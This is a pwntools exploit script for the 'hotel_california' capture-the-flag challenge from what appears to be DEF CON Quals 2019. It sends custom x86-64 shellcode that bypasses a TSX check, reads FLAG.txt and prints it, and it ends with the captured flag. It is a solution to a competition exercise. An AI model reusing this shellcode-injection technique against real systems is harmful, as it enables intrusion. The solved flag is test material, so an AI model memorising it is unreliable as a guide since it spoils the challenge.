from pwn import *
import time
import ctypes


DEBUG = False

context.update(arch="amd64", os="linux", bits=64)

if __name__ == "__main__":
    elf = ELF("./hotel_california")
    if DEBUG:
        p = process("./hotel_california")
    else:
        p = remote("hotelcalifornia.quals2019.oooverflow.io", 7777)

    ### non-NULL shellcode:
    ###  - reads the 1st random number from the stack
    ###  - stores it back using `xrelease mov`, which allows the `xtest` check to pass
    ###  - prints "FLAG.txt"
    # nasm -f bin shellcode.asm -o shellcode && hexdump -v -e '"\\" "x" 1/1 "%02X"' shellcode; echo
    shellcode = "\xEB\x29\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x48\x8B\x1D\xE1\xFF\xFF\xFF\x48\x81\xEB\x08\xDC\xFF\xFF\x48\x8B\x13\x8B\x92\x7C\xFA\xFF\xFF\x48\x8D\x3D\x72\xFF\xFF\xFF\xF3\x89\x17\x48\x8B\x23\x48\x81\xC4\x78\x77\xFE\xFF\x6A\x74\x48\xB8\x2F\x46\x4C\x41\x47\x2E\x74\x78\x50\x48\x89\xE7\x6A\x01\x5A\x31\xF6\x6A\x02\x58\x0F\x05\x48\x89\xC7\x31\xC0\x48\x89\xE6\x6A\x7F\x5A\x0F\x05\x48\x89\xC2\x6A\x01\x58\x48\x89\xC7\x0F\x05"

    ### if we send 0x400 bytes, certain bytes will persist for the next loops malloc
    shellcode += "B"*(0x400-len(shellcode))
    p.sendafter("> ", shellcode)

    ### if we send an EOF, we get to the 2nd loop, and the first random number stays on the stack
    ### this allows our shellcode to run

    # send EOF
    p.shutdown()

    # recv until flag is sent
    p.interactive()
    p.close()
"""
OOO{We haven't had a proper TSX implementation here since nineteen sixty-nine}
"""
